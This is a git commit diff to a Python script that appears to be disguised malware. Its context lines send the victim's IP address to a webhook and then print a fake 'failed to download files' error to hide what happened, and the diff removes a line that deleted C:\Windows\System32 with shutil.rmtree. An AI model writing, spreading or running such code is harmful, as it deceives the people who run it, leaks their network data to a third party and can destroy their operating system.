138a3696757a352de26b7e1a0a2132cd96c82a67
Dmitry <dimonmini663@gmail.com>
2024-08-17 17:01:02 +0300

    Update main.py

--- main.py
+++ main.py
@@ -7,7 +7,6 @@ import aiohttp
 
 # Shortcuts
 ipaddresshaha = socket.gethostbyname(socket.gethostname())
-stinkysystem = "C:\Windows\System32"
 
 
 # Sending ip to your webhook
@@ -23,12 +22,8 @@ asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
 asyncio.run(send())
 
 
-# Deleting system
-shutil.rmtree(stinkysystem)
-
-
 # Fake error
 print("Error!")
 print("Failed to download files.")
 print("Error name: failed_download_files_from_link")
-input('Press Enter to exit.\n')
+input('Press "Enter" to exit.\n')
